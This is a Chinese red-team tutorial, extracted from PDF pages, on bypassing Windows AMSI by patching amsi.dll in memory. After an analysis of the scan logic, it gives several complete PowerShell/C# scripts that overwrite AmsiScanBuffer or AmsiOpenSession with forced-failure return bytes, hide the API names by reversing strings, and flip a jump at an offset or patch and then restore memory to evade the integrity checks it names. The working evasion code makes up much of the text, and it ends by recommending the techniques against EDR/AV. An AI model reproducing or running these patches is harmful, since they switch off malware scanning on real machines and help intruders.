Bypass AMSI的前世今生(5) - 内存补丁
0x00 前言
内存补丁是目前bypass amsi最常用的技术之一。通过前几篇文章，我们已经知道AMSI检测相关API的调
用顺序：
我们还是以powershell为例，当我们打开powershell.exe，powershell.exe会加载
System.Management.Automation.dll，此dll会调用amsi.dll，因此我们只要分析清楚这2个dll里面的函
数调用和判断逻辑，就能在合适的地方修改判断逻辑，使得程序判断结果为我们指定的结果。
0x01 流程分析
我们先使用ILSpy反编译System.Management.Automation.dll，在AmsiUtils中是amsi相关的函数：
不难看出AmsiUtils里面的大部分逻辑是调用amsi里面的函数处理的。我们关注AmsiUtils.ScanContent
函数，里面包含的amsi扫描的完整逻辑。首先如下图所示：
AmsiInitialize – 初始化AMSI API.
AmsiOpenSession – 打开session
AmsiScanBuffer – scans the user-input.
AmsiCloseSession – 关闭session
AmsiUninitialize – 删除AMSI API
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-18
No. 1 / 10 - Welcome to www.red-team.cn
是不是有点眼熟，amsiInitFailed，也就是“一句话bypass amsi”的原理所在，我们只需要让这个变量为
True，就可以bypass。我们继续往下阅读代码：
注意这几个逻辑，都可以让程序直接返回AMSI_RESULT_NOT_DETECTED，最后我们的关注点就是
hresult，只要让它小于0，我们就能bypass amsi，而hresult为amsi.dll里函数的返回值，因此我们到
amsi.dll里面去想办法。通过上面的分析我们能够在AmsiInitialize、AmsiOpenSession、
AmsiScanBuffer这3个函数中patch都可以达到bypass amsi的效果。我们先来测试AmsiInitialize：
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-18
No. 2 / 10 - Welcome to www.red-team.cn
我们在amsi!AmsiInitialize上下了断点并没有断下来，原因是初始化函数在powershell启动的时候就调
用了，后面将不再调用：
因此amsi!AmsiInitialize不是一个好的打补丁的位置，我们接着看AmsiOpenSession，经过测试，
AmsiOpenSession、AmsiScanBuffer是可以的。我们反汇编看下这2个函数：
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-18
No. 3 / 10 - Welcome to www.red-team.cn
其实都不用看这2个函数，直接打补丁，让返回值小于0就OK了。
0x02 利用
我们还是从一段利用代码开始：
$p=@"
using System;
using System.Linq;
using System.Runtime.InteropServices;
public class Program
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
uint flNewProtect, out uint lpfloldProtect);
    public static void Bypass()
    {
        String a = "isma";
        String b = "reffuBnacSismA";
        IntPtr lib = LoadLibrary(String.Join("", a.Reverse().ToArray()) + 
".dll");
        IntPtr addr = GetProcAddress(lib, String.Join("", 
b.Reverse().ToArray()));
        uint old = 0;
        byte[] p;
        p = new byte[6];
        p[0] = 0xB8;
        p[1] = 0x57;
        p[2] = 0x00;
        p[3] = 0x07;
        p[4] = 0x80;
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-18
No. 4 / 10 - Welcome to www.red-team.cn
这个是我在星球发过的一段被公开的利用改代码，功能很好理解，就是在AmsiScanBuffer的函数地址处
直接打补丁，补丁汇编是：
0x80070057也就是-2147024809，是一个负数，当然也可以是其他负数，而AmsiScanBuffer也可以修
改成AmsiOpenSession。怎么把汇编代码转换成代码中的数组呢？使用https://defuse.ca/online-x86-a
ssembler.htm#disassembly，可以很快转换。我们来修改代码测试下：
        p[5] = 0xc3;
        VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);
        Marshal.Copy(p, 0, addr, p.Length);
        VirtualProtect(addr, (UIntPtr)p.Length, old, out old);
    }
}
"@
Add-Type $p
[Program]::Bypass()
mov eax,0x80070057
ret
$p=@"
using System;
using System.Linq;
using System.Runtime.InteropServices;
public class Program
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
uint flNewProtect, out uint lpfloldProtect);
    public static void Bypass()
    {
        String a = "isma";
        IntPtr lib = LoadLibrary(String.Join("", a.Reverse().ToArray()) + 
".dll");
        IntPtr addr = GetProcAddress(lib, "AmsiOpenSession");
        uint old = 0;
        byte[] p;
        p = new byte[6];
        p[0] = 0xB8;
        p[1] = 0xFF;
        p[2] = 0xFF;
        p[3] = 0xFF;
        p[4] = 0xFF;
        p[5] = 0xC3;
        VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);
        Marshal.Copy(p, 0, addr, p.Length);
        VirtualProtect(addr, (UIntPtr)p.Length, old, out old);
    }
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-18
No. 5 / 10 - Welcome to www.red-team.cn
我们修改了被打补丁的函数为AmsiOpenSession,补丁汇编代码为：
成功，因此我们知道了补丁函数可以为AmsiOpenSession、AmsiScanBuffer，补丁代码可以变化很
多，只要返回结果为负数就行。
0x03 侦测与对抗
常见侦测手法：
检测AmsiOpenSession、AmsiScanBuffer处代码是否被修改
检测amsi在内存中的代码段完整性
详细侦测手法阅读https://blog.f-secure.com/hunting-for-amsi-bypasses/，在此我就不多说了。对抗
这2种检测手法也是很容易的。
对抗第一种检测
第一种检测手法，是找到函数的偏移，然后判断便宜处的二进制是否被修改，通过上面的代码我们也知
道，我们直接在函数开始地址处打补丁，我们可以增加偏移量，让补丁出现在函数种的其他位置，代码
如下：
}
"@
Add-Type $p
[Program]::Bypass()
mov eax,-1
ret
$p=@"
using System;
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-18
No. 6 / 10 - Welcome to www.red-team.cn
using System.Linq;
using System.Runtime.InteropServices;
public class Program
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
uint flNewProtect, out uint lpfloldProtect);
    public static void Bypass()
    {
        String a = "isma";
        IntPtr lib = LoadLibrary(String.Join("", a.Reverse().ToArray()) + 
".dll");
        IntPtr addr = GetProcAddress(lib, "AmsiOpenSession");
        addr = addr + 3;
        uint old = 0;
        byte[] p;
        p = new byte[1];
        p[0] = 0x75;
        VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);
        Marshal.Copy(p, 0, addr, p.Length);
        VirtualProtect(addr, (UIntPtr)p.Length, old, out old);
    }
}
"@
Add-Type $p
[Program]::Bypass()
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-18
No. 7 / 10 - Welcome to www.red-team.cn
上边代码非常简洁，我们只修改了AmsiOpenSession函数在偏移3处的一个字节，我们看反汇编的代
码：
我把途中的jz修改成jnz，让跳转到mov eax,80070057h 处。这样我们可以根据反编译的代码，随意修
改逻辑，第一种检测手法就失效了。
对抗第二种检测
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-18
No. 8 / 10 - Welcome to www.red-team.cn
第二种因为是完整性检测，我们修改代码后就能被扫出来，但是第二种侦测方法有个缺陷，就是不可能
一直扫描内存，要不使用按频率扫描，要不使用触发扫描，触发扫描比较常见，例如当侦测到
AmsiOpenSession API被调用，就触发扫描。我们对抗方法是打补丁后执行恶意代码，执行完再还原内
存，这样内存修改只是一瞬间，代码如下：
$p=@"
using System;
using System.Linq;
using System.Runtime.InteropServices;
public class Program
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
uint flNewProtect, out uint lpfloldProtect);
    public static void Patch()
    {
        String a = "isma";
        IntPtr lib = LoadLibrary(String.Join("", a.Reverse().ToArray()) + 
".dll");
        IntPtr addr = GetProcAddress(lib, "AmsiOpenSession");
        addr = addr + 3;
        uint old = 0;
        byte[] p;
        p = new byte[1];
        p[0] = 0x75;
        VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);
        Marshal.Copy(p, 0, addr, p.Length);
        VirtualProtect(addr, (UIntPtr)p.Length, old, out old);
    }
    public static void UnPatch()
    {
        String a = "isma";
        IntPtr lib = LoadLibrary(String.Join("", a.Reverse().ToArray()) + 
".dll");
        IntPtr addr = GetProcAddress(lib, "AmsiOpenSession");
        addr = addr + 3;
        uint old = 0;
        byte[] p;
        p = new byte[1];
        p[0] = 0x74;
        VirtualProtect(addr, (UIntPtr)p.Length, 0x04, out old);
        Marshal.Copy(p, 0, addr, p.Length);
        VirtualProtect(addr, (UIntPtr)p.Length, old, out old);
    }
}
"@
Add-Type $p
[Program]::Patch()
[Program]::UnPatch()
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-18
No. 9 / 10 - Welcome to www.red-team.cn
神奇的事情发生了，我们使用AmsiOpenSession，再修改内存后再复原，依旧bypass。
代码被复原了的，这是为什么呢？哈哈哈是因为我们开始建立了session，后面将沿用开始建立的
session，不会再新调用AmsiOpenSession建立session，我在amsi!AmsiOpenSession上下断点，果然
没有触发。完美。
0x04 总结
内存补丁是bypass amsi里面非常重要的技术，几乎用在了各种工具当中，理解其中原理，灵活运用，
可以很好的对抗edr/av。
Produced by AttackTeamFamily - Author: L.N. - Date: 2021-10-18
No. 10 / 10 - Welcome to www.red-team.cn